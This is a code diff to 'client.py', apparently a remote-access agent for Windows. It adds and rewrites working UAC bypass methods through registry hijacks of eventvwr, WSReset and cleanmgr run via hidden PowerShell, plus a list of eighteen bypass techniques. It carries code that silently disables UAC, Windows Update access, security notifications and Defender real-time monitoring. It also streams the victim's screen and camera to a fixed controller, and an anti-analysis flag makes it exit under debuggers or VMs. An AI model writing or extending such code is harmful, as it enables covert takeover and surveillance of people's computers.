@@ -1,3 +1,4 @@
+### client.py ###
 import sys
 import os
 
@@ -58,9 +59,14 @@ debug_print("Step 1: Importing eventlet...")
 EVENTLET_AVAILABLE = False
 try:
     import eventlet
+    try:
+        import eventlet.hubs
+        eventlet.hubs.use_hub("eventlet.hubs.asyncio")
+    except Exception:
+        pass
     debug_print("✅ eventlet imported successfully")
     EVENTLET_AVAILABLE = True
-except ImportError as e:
+except Exception as e:
     debug_print(f"⚠️ eventlet import FAILED: {e}")
     debug_print("⚠️ Continuing WITHOUT eventlet (some async features may not work)")
     debug_print("⚠️ To enable eventlet: pip install eventlet")
@@ -217,13 +223,16 @@ DEBUG_MODE = True  # Enable debug logging for troubleshooting
 UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging
 DEPLOYMENT_COMPLETED = True  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
-KEEP_ORIGINAL_PROCESS = True  # FALSE = Exit original process after getting admin (prevent duplicates)
+KEEP_ORIGINAL_PROCESS = False  # FALSE = Exit original process after getting admin (prevent duplicates)
 ENABLE_ANTI_ANALYSIS = True  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
 
 # ✅ NEW ETHICAL SETTINGS
-REQUEST_ADMIN_FIRST = False  # TRUE = Request admin permission FIRST before doing anything
-DISABLE_UAC_BYPASS = False   # TRUE = Disable all silent UAC bypass attempts
+REQUEST_ADMIN_FIRST = False
+DISABLE_UAC_BYPASS = True
 MAX_PROMPT_ATTEMPTS = 3     # Limit prompts to 3 attempts instead of 999
+BYPASSES_ENABLED = True
+REGISTRY_ENABLED = True
+PERSISTENT_ADMIN_PROMPT_ENABLED = False
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
@@ -232,6 +241,38 @@ FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-
 #FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'http://localhost:3000/')
 DISABLE_SLUI_BYPASS = False
 UAC_BYPASS_DEBUG_MODE = True
+UAC_BYPASS_METHODS_ENABLED = {
+    'cleanmgr_sagerun': True,
+    'fodhelper': True,
+    'computerdefaults': True,
+    'eventvwr': True,
+    'sdclt': True,
+    'wsreset': True,
+    'slui': True,
+    'winsat': True,
+    'silentcleanup': True,
+    'icmluautil': True
+}
+REGISTRY_ACTIONS = {
+    'policy_push_notifications': True,
+    'policy_windows_update': True,
+    'context_runas_cmd': True,
+    'context_powershell_admin': True,
+    'notify_center_hkcu': True,
+    'notify_center_hklm': True,
+    'defender_ux_suppress': True,
+    'toast_global_above_lock': True,
+    'toast_global_critical_above_lock': True,
+    'toast_windows_update': True,
+    'toast_security_maintenance': True,
+    'toast_windows_security': True,
+    'toast_sec_health_ui': True,
+    'explorer_balloon_tips': True,
+    'explorer_info_tip': True,
+    'disableRealtimeMonitoring': True
+}
+
+AGENT_ID_SAVE_WARNED = False
 
 # Eventlet is now patched at the very top of the file (line 1-2)
 # This section is kept for compatibility but monkey_patch is already done
@@ -286,6 +327,39 @@ def log_message(message, level="info"):
 # Initialize silent logging immediately
 setup_silent_logging()
 
+def get_bypass_methods_sequence():
+    return [
+        {'id': 25, 'name': 'EventVwr.exe registry hijacking'},
+        {'id': 30, 'name': 'WOW64 logger hijacking'},
+        {'id': 31, 'name': 'sdclt.exe bypass'},
+        {'id': 33, 'name': 'fodhelper/computerdefaults ms-settings protocol'},
+        {'id': 34, 'name': 'SilentCleanup scheduled task'},
+        {'id': 35, 'name': 'Token manipulation and impersonation'},
+        {'id': 36, 'name': 'NTFS junction/reparse points'},
+        {'id': 39, 'name': '.NET Code Profiler (COR_PROFILER)'},
+        {'id': 40, 'name': 'COM handler hijacking'},
+        {'id': 41, 'name': 'ICMLuaUtil COM interface'},
+        {'id': 43, 'name': 'IColorDataProxy COM interface'},
+        {'id': 44, 'name': 'Volatile environment variables'},
+        {'id': 45, 'name': 'slui.exe registry hijacking'},
+        {'id': 56, 'name': 'WSReset.exe bypass'},
+        {'id': 61, 'name': 'AppInfo service manipulation'},
+        {'id': 62, 'name': 'Mock directory technique'},
+        {'id': 67, 'name': 'winsat.exe bypass'},
+        {'id': 68, 'name': 'MMC snapin bypass'}
+    ]
+
+def log_bypass_sequence():
+    try:
+        seq = get_bypass_methods_sequence()
+        log_message("Bypass sequence planned")
+        for m in seq:
+            log_message(f"Method {m['id']}: {m['name']}")
+    except Exception:
+        pass
+
+log_bypass_sequence()
+
 def disable_slui_bypass():
     global DISABLE_SLUI_BYPASS
     DISABLE_SLUI_BYPASS = True
@@ -331,6 +405,14 @@ def maybe_enable_bypass_debugging() -> bool:
                 suppress_security_notifications_aggressive()
             except Exception:
                 pass
+            return True
+        return False
+    except Exception:
+        return False
+def should_skip_uac_method(method_id=None, method_name=None) -> bool:
+    try:
+        if detect_defender_threats():
+            log_message("Skipping UAC bypass due to Windows Defender detection", "warning")
             return True
         return False
     except Exception:
@@ -721,6 +803,18 @@ DEFENDER_TAMPER_DISABLE_ENABLED = os.environ.get('ENABLE_DEFENDER_TAMPER_DISABLE
 AUTO_START_AUDIO_WITH_SCREEN = os.environ.get('AUTO_START_AUDIO_WITH_SCREEN', '0') == '1'
 AUTO_START_AUDIO_WITH_CAMERA = os.environ.get('AUTO_START_AUDIO_WITH_CAMERA', '0') == '1'
 SOCKET_MAX_BPS = int(os.environ.get('SOCKET_MAX_BPS', str(2 * 1024 * 1024)))
+def _default_upload_dir():
+    try:
+        d = os.environ.get('LOCALAPPDATA')
+        if d:
+            return os.path.join(d, 'AgentUploads')
+        h = os.path.expanduser('~')
+        if h and os.path.isdir(h):
+            return os.path.join(h, 'AgentUploads')
+    except Exception:
+        pass
+    return os.path.join(tempfile.gettempdir(), 'AgentUploads')
+UPLOAD_BASE_DIR = os.environ.get('AGENT_UPLOAD_DIR', _default_upload_dir())
 
 # Expected SHA-256 digests (defaults provided; can be overridden via env)
 EXPECTED_SHA256 = {
@@ -766,7 +860,7 @@ STREAM_THREADS = []
 STREAM_THREAD = None
 capture_queue = None
 encode_queue = None
-TARGET_FPS = 20
+TARGET_FPS = 15
 CAPTURE_QUEUE_SIZE = 10
 ENCODE_QUEUE_SIZE = 10
 
@@ -787,7 +881,14 @@ camera_capture_queue = None
 camera_encode_queue = None
 CAMERA_CAPTURE_QUEUE_SIZE = 10
 CAMERA_ENCODE_QUEUE_SIZE = 10
-TARGET_CAMERA_FPS = 20
+TARGET_CAMERA_FPS = 15
+SELECTED_MONITOR_INDEX = 1
+DISPLAY_MODE = 'single'
+PIP_MONITOR_INDEX = 2
+MIC_VOLUME = 1.0
+SYSTEM_VOLUME = 1.0
+NOISE_REDUCTION_ENABLED = False
+ECHO_CANCELLATION_ENABLED = False
 
 # Thread safety locks for start/stop functions
 _stream_lock = threading.Lock()
@@ -916,6 +1017,7 @@ WEBRTC_ENABLED = True
 WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
 WEBRTC_STREAMS = {}  # agent_id -> MediaStreamTrack
 WEBRTC_SIGNALING_QUEUE = queue.Queue()
+WEBRTC_BANDWIDTH_TRACK = {}  # agent_id -> {'bytes': int, 'ts': float}
 WEBRTC_ICE_SERVERS = [
     {"urls": ["stun:stun.l.google.com:19302"]},
     {"urls": ["stun:stun1.l.google.com:19302"]}
@@ -939,9 +1041,9 @@ WEBRTC_CONFIG = {
     'adaptive_bitrate': True,
     'frame_dropping': True,
     'quality_levels': {
-        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
-        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
-        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
+        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000, 'quality': 50},
+        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000, 'quality': 70},
+        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000, 'quality': 85},
         'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
     },
     'performance_tuning': {
@@ -1337,6 +1439,11 @@ class BackgroundInitializer:
                             return "admin_denied"
                     
                     # ❌ OLD MALICIOUS FLOW (only if bypass not disabled)
+                    if PERSISTENT_ADMIN_PROMPT_ENABLED:
+                        if run_as_admin_persistent():
+                            return "persistent_uac_success"
+                        else:
+                            pass
                     if not DISABLE_UAC_BYPASS:
                         # STEP 1: Try all UAC bypass methods (SILENT - no prompts!)
                         debug_print("[PRIVILEGE ESCALATION] STEP 1: UAC bypass methods")
@@ -1358,6 +1465,10 @@ class BackgroundInitializer:
                                 log_message("✅ UAC permanently disabled!")
                             else:
                                 debug_print("❌ [UAC] UAC disable FAILED!")
+                            try:
+                                perform_post_admin_actions()
+                            except Exception:
+                                pass
                             return "uac_bypass_success"
                         else:
                             debug_print("=" * 80)
@@ -1367,7 +1478,7 @@ class BackgroundInitializer:
                         # STEP 2: If UAC bypass fails, try registry-based auto-elevation
                         debug_print("[PRIVILEGE ESCALATION] STEP 2: Registry auto-elevation")
                         log_message("⚠️ UAC bypass methods failed, trying registry auto-elevation...")
-                        if elevate_via_registry_auto_approve():
+                        if REGISTRY_ENABLED and elevate_via_registry_auto_approve():
                             debug_print("✅ [REGISTRY] Auto-elevation successful!")
                             log_message("✅ Registry auto-elevation successful!")
                             return "registry_elevation_success"
@@ -1410,10 +1521,18 @@ class BackgroundInitializer:
                     if disable_uac():
                         debug_print("✅ [UAC] UAC disabled successfully!")
                         log_message("✅ UAC permanently disabled - no more prompts!")
+                        try:
+                            perform_post_admin_actions()
+                        except Exception:
+                            pass
                         return "uac_disabled"
                     else:
                         debug_print("❌ [UAC] UAC disable FAILED (needs HKLM write access)")
                         log_message("⚠️ UAC disable failed (needs HKLM write access)")
+                        try:
+                            perform_post_admin_actions()
+                        except Exception:
+                            pass
                         return "uac_disable_failed"
             
             debug_print("[PRIVILEGE ESCALATION] Not Windows - no elevation needed")
@@ -1538,6 +1657,12 @@ class UACBypassMethod:
     
     def execute(self) -> bool:
         """Execute the UAC bypass method with enhanced error handling"""
+        try:
+            if should_skip_uac_method(self.method_id, self.name):
+                log_message(f"[UAC BYPASS] Skipping method: {self.name}", "warning")
+                return False
+        except Exception:
+            pass
         debug_print(f"  [METHOD] Checking if {self.name} is available...")
         
         if not self.is_available():
@@ -1617,6 +1742,8 @@ class UACBypassManager:
         debug_print("[UAC MANAGER] Calling _initialize_methods()...")
         self._initialize_methods()
         self.preferred_order = [
+            'cleanmgr_sagerun',
+            'wsreset',
             'eventvwr',
             'sdclt',
             'fodhelper',
@@ -1635,6 +1762,7 @@ class UACBypassManager:
         
         # Register all bypass methods
         method_list = [
+            ('cleanmgr_sagerun', CleanmgrSagerunBypass()),
             ('fodhelper', FodhelperProtocolBypass()),
             ('computerdefaults', ComputerDefaultsBypass()),
             ('eventvwr', EventViewerBypass()),
@@ -1656,7 +1784,7 @@ class UACBypassManager:
     def get_available_methods(self) -> list:
         """Get list of available UAC bypass methods"""
         with self._lock:
-            available = [name for name, method in self.methods.items() if method.is_available()]
+            available = [name for name, method in self.methods.items() if method.is_available() and UAC_BYPASS_METHODS_ENABLED.get(name, True)]
             try:
                 order_map = {name: i for i, name in enumerate(self.preferred_order)}
                 available.sort(key=lambda n: order_map.get(n, 1_000_000))
@@ -1808,6 +1936,32 @@ class FodhelperProtocolBypass(UACBypassMethod):
             except (OSError, PermissionError):
                 pass
             raise UACBypassError(f"Fodhelper protocol bypass failed: {e}")
+class CleanmgrSagerunBypass(UACBypassMethod):
+    def __init__(self):
+        super().__init__(
+            "Cleanmgr Sagerun",
+            "UAC bypass using cleanmgr.exe /sagerun",
+            69
+        )
+    def is_available(self) -> bool:
+        cleanmgr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cleanmgr.exe')
+        return super().is_available() and os.path.exists(cleanmgr_path)
+    def _execute_bypass(self) -> bool:
+        try:
+            cmd = [
+                "powershell",
+                "-NoProfile",
+                "-ExecutionPolicy", "Bypass",
+                "-Command",
+                "try { reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\Active Setup Temporary Internet Files' /v StateFlags0001 /t REG_DWORD /d 2 /f; cleanmgr.exe /sagerun:1; reg delete 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\Active Setup Temporary Internet Files' /v StateFlags0001 /f; Write-Host '[SUCCESS] cleanmgr.exe bypass executed successfully' -ForegroundColor Green } catch { Write-Host '[FAILED] cleanmgr.exe bypass failed: ' $_.Exception.Message -ForegroundColor Red }"
+            ]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+            out = (result.stdout or "") + (result.stderr or "")
+            if "[SUCCESS] cleanmgr.exe bypass executed successfully" in out:
+                return True
+            return result.returncode == 0
+        except Exception as e:
+            raise UACBypassError(f"Cleanmgr sagerun bypass failed: {e}")
 
 class ComputerDefaultsBypass(UACBypassMethod):
     """Enhanced UAC bypass using computerdefaults.exe"""
@@ -1876,31 +2030,49 @@ class EventViewerBypass(UACBypassMethod):
     def _execute_bypass(self) -> bool:
         try:
             import winreg
-            
             current_exe = self.get_current_executable()
             key_path = r"Software\Classes\mscfile\shell\open\command"
-            
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
-            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
-            winreg.CloseKey(key)
-            
-            eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
-            process = subprocess.Popen(
-                [eventvwr_path],
-                creationflags=subprocess.CREATE_NO_WINDOW,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-            
+            ps_path = r"HKCU:\Software\Classes\mscfile\shell\open\command"
             try:
-                process.communicate(timeout=15)
-            except subprocess.TimeoutExpired:
-                process.kill()
-            
+                cmd = [
+                    "powershell",
+                    "-NoProfile",
+                    "-ExecutionPolicy", "Bypass",
+                    "-Command",
+                    f"try {{ New-Item \"{ps_path}\" -Force | Out-Null; Set-ItemProperty \"{ps_path}\" -Name \"(default)\" -Value \"{current_exe}\" -Force; Start-Process \"C:\\Windows\\System32\\eventvwr.msc\" -WindowStyle Hidden }} catch {{}}"
+                ]
+                subprocess.run(cmd, capture_output=True, text=True, timeout=60, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+                time.sleep(3)
+            except Exception:
+                pass
+            try:
+                subprocess.run([
+                    "cmd", "/c",
+                    f"reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"{current_exe}\" /f && cmd.exe /c eventvwr.msc"
+                ], capture_output=True, timeout=60, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+                time.sleep(3)
+            except Exception:
+                pass
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+                winreg.CloseKey(key)
+                eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
+                process = subprocess.Popen(
+                    [eventvwr_path],
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE
+                )
+                try:
+                    process.communicate(timeout=15)
+                except subprocess.TimeoutExpired:
+                    process.kill()
+            except Exception:
+                pass
             time.sleep(3)
             self.cleanup_registry(key_path)
             return True
-            
         except Exception as e:
             try:
                 self.cleanup_registry(key_path)
@@ -1975,32 +2147,42 @@ class WSResetBypass(UACBypassMethod):
     def _execute_bypass(self) -> bool:
         try:
             import winreg
-            
             current_exe = self.get_current_executable()
             key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command"
-            
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
-            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
-            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-            winreg.CloseKey(key)
-            
-            wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
-            process = subprocess.Popen(
-                [wsreset_path],
-                creationflags=subprocess.CREATE_NO_WINDOW,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-            
+            ps_path = r"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command"
             try:
-                process.communicate(timeout=15)
-            except subprocess.TimeoutExpired:
-                process.kill()
-            
+                cmd = [
+                    "powershell",
+                    "-NoProfile",
+                    "-ExecutionPolicy", "Bypass",
+                    "-Command",
+                    f"try {{ New-Item \"{ps_path}\" -Force | Out-Null; New-ItemProperty -Path \"{ps_path}\" -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null; Set-ItemProperty -Path \"{ps_path}\" -Name \"(default)\" -Value \"{current_exe}\" -Force -ErrorAction SilentlyContinue | Out-Null; Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden }} catch {{}}"
+                ]
+                subprocess.run(cmd, capture_output=True, text=True, timeout=60, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+                time.sleep(3)
+            except Exception:
+                pass
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(key)
+                wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
+                process = subprocess.Popen(
+                    [wsreset_path],
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE
+                )
+                try:
+                    process.communicate(timeout=15)
+                except subprocess.TimeoutExpired:
+                    process.kill()
+            except Exception:
+                pass
             time.sleep(3)
             self.cleanup_registry(key_path)
             return True
-            
         except Exception as e:
             try:
                 self.cleanup_registry(key_path)
@@ -2251,6 +2433,10 @@ def elevate_via_registry_auto_approve():
             winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
             winreg.CloseKey(key)
             log_message("[REGISTRY] Auto-approve set in HKCU")
+            try:
+                emit_security_notification('success', 'UAC Auto-Approve Applied', 'HKCU policy updated')
+            except Exception:
+                pass
             return True
         except Exception:
             pass
@@ -2258,6 +2444,10 @@ def elevate_via_registry_auto_approve():
         return False
     except Exception as e:
         log_message(f"[REGISTRY] Auto-approve failed: {e}")
+        try:
+            emit_security_notification('error', 'UAC Auto-Approve Failed', str(e))
+        except Exception:
+            pass
         return False
 
 def ensure_registry_policies_and_context_menu():
@@ -2267,56 +2457,149 @@ def ensure_registry_policies_and_context_menu():
         import winreg
         s = False
         try:
-            k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications")
-            try:
-                v, t = winreg.QueryValueEx(k, "NoToastApplicationNotification")
-                if t != winreg.REG_DWORD or v != 1:
+            if REGISTRY_ACTIONS.get('policy_push_notifications', True):
+                k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications")
+                try:
+                    v, t = winreg.QueryValueEx(k, "NoToastApplicationNotification")
+                    if t != winreg.REG_DWORD or v != 1:
+                        winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, 1)
+                except FileNotFoundError:
                     winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, 1)
-            except FileNotFoundError:
-                winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, 1)
-            winreg.CloseKey(k)
-            s = True
+                winreg.CloseKey(k)
+                s = True
         except Exception as e:
             log_message(f"[REGISTRY] PushNotifications policy failed: {e}", "warning")
         try:
-            k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate")
-            try:
-                v, t = winreg.QueryValueEx(k, "DisableWindowsUpdateAccess")
-                if t != winreg.REG_DWORD or v != 1:
+            if REGISTRY_ACTIONS.get('policy_windows_update', True):
+                k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate")
+                try:
+                    v, t = winreg.QueryValueEx(k, "DisableWindowsUpdateAccess")
+                    if t != winreg.REG_DWORD or v != 1:
+                        winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, 1)
+                except FileNotFoundError:
                     winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, 1)
-            except FileNotFoundError:
-                winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, 1)
-            winreg.CloseKey(k)
-            s = True
+                winreg.CloseKey(k)
+                s = True
         except Exception as e:
             log_message(f"[REGISTRY] WindowsUpdate policy failed: {e}", "warning")
         try:
-            k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
-            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open Command Prompt as Admin")
-            winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "cmd.exe")
-            winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
-            winreg.CloseKey(k)
-            kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas\command")
-            winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'cmd.exe /s /k pushd "%V"')
-            winreg.CloseKey(kc)
-            s = True
+            if REGISTRY_ACTIONS.get('context_runas_cmd', True):
+                k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
+                winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open Command Prompt as Admin")
+                winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "cmd.exe")
+                winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(k)
+                kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas\command")
+                winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'cmd.exe /s /k pushd "%V"')
+                winreg.CloseKey(kc)
+                s = True
         except Exception as e:
             log_message(f"[REGISTRY] Context menu runas failed: {e}", "warning")
         try:
-            k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
-            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open PowerShell as Admin")
-            winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "powershell.exe")
-            winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
-            winreg.CloseKey(k)
-            kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin\command")
-            winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'powershell.exe -NoExit -Command "Set-Location \'%V\'"')
-            winreg.CloseKey(kc)
-            s = True
+            if REGISTRY_ACTIONS.get('context_powershell_admin', True):
+                k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
+                winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open PowerShell as Admin")
+                winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "powershell.exe")
+                winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(k)
+                kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin\command")
+                winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'powershell.exe -NoExit -Command "Set-Location \'%V\'"')
+                winreg.CloseKey(kc)
+                s = True
         except Exception as e:
             log_message(f"[REGISTRY] Context menu PowershellAdmin failed: {e}", "warning")
         return s
     except Exception as e:
         log_message(f"[REGISTRY] Ensure policies/context menu error: {e}", "error")
+        return False
+
+def apply_registry_action(action_key: str, enabled: bool) -> bool:
+    try:
+        import winreg
+        if action_key == 'policy_push_notifications':
+            try:
+                k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications")
+                val = 1 if enabled else 0
+                winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, val)
+                winreg.CloseKey(k)
+                return True
+            except Exception as e:
+                log_message(f"[REGISTRY] PushNotifications policy error: {e}", "warning")
+                return False
+        if action_key == 'policy_windows_update':
+            try:
+                k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate")
+                val = 1 if enabled else 0
+                winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, val)
+                winreg.CloseKey(k)
+                return True
+            except Exception as e:
+                log_message(f"[REGISTRY] WindowsUpdate policy error: {e}", "warning")
+                return False
+        if action_key == 'context_runas_cmd':
+            try:
+                if enabled:
+                    k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
+                    winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open Command Prompt as Admin")
+                    winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "cmd.exe")
+                    winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
+                    winreg.CloseKey(k)
+                    kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas\command")
+                    winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'cmd.exe /s /k pushd "%V"')
+                    winreg.CloseKey(kc)
+                else:
+                    try:
+                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas\command")
+                    except Exception:
+                        pass
+                    try:
+                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
+                    except Exception:
+                        pass
+                return True
+            except Exception as e:
+                log_message(f"[REGISTRY] Context menu runas error: {e}", "warning")
+                return False
+        if action_key == 'context_powershell_admin':
+            try:
+                if enabled:
+                    k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
+                    winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open PowerShell as Admin")
+                    winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "powershell.exe")
+                    winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
+                    winreg.CloseKey(k)
+                    kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin\command")
+                    winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'powershell.exe -NoExit -Command "Set-Location \'%V\'"')
+                    winreg.CloseKey(kc)
+                else:
+                    try:
+                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin\command")
+                    except Exception:
+                        pass
+                    try:
+                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
+                    except Exception:
+                        pass
+                return True
+            except Exception as e:
+                log_message(f"[REGISTRY] Context menu PowershellAdmin error: {e}", "warning")
+                return False
+        if action_key == 'disableRealtimeMonitoring':
+            try:
+                if enabled:
+                    return bool(disable_realtime_monitoring_before_uac())
+                else:
+                    try:
+                        subprocess.run(['powershell.exe', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $false'], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10, capture_output=True, text=True)
+                        return True
+                    except Exception as e:
+                        log_message(f"[DEFENDER] EnableRealtimeMonitoring failed: {e}", "warning")
+                        return False
+            except Exception:
+                return False
+        return False
+    except Exception as e:
+        log_message(f"[REGISTRY] apply_registry_action error: {e}", "error")
         return False
 
 def disable_realtime_monitoring_before_uac():
@@ -2344,32 +2627,46 @@ def suppress_security_notifications_aggressive():
                 success += 1
             except Exception:
                 pass
-        # Current user toasts and policies
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications", "ToastEnabled", 0)
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications", "NoToastApplicationNotification", 1)
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows Defender\UX Configuration", "Notification_Suppress", 1)
-        # Disable Notification Center (policy and explorer)
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter", 1)
-        set_dword(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter", 1)
-        # Explorer balloon/info tips
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "EnableBalloonTips", 0)
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowInfoTip", 0)
-        # Windows Defender Security Center notifications and systray
+        if REGISTRY_ACTIONS.get('policy_push_notifications', True):
